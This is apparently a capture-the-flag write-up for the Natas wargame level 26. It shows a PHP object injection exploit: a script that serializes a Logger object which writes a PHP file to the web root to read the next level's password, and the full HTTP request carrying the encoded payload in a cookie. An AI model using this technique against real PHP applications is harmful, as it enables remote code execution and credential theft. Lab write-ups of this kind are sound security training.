# Level 26 -> Level 27

```php
<?php

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;
    
    function __construct(){
        $this->initMsg="heyyyyyy\n";
        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";
        $this->logFile = "/var/www/natas/natas26/img/pwn4.php";
    }
}

$o = new Logger();
print base64_encode(serialize($o))."\n";

?>
```

use this script to exploit PHP object injection as the source code contains unserialize  

```php
$drawing=unserialize(base64_decode($_COOKIE["drawing"]));
```

so we use that script to send a serialized object which gets the file contents of password of natas27 and writes it to the log file mentioned  

the base64 encode of the serialized object got from running the php script is sent as cookie **drawing** which is then decoded, unserialized and executed at the server  

```
GET /?x1=1&y1=1&x2=1&y2=1 HTTP/1.1
Host: natas26.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://natas26.natas.labs.overthewire.org/
Connection: keep-alive
Cookie: PHPSESSID=uiptf3bq1jsspavldfchlpqf17; drawing=Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNToiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvcHduNC5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo5OiJoZXl5eXl5eQoiO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo2MzoiPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygnL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4KIjt9
Upgrade-Insecure-Requests: 1
```

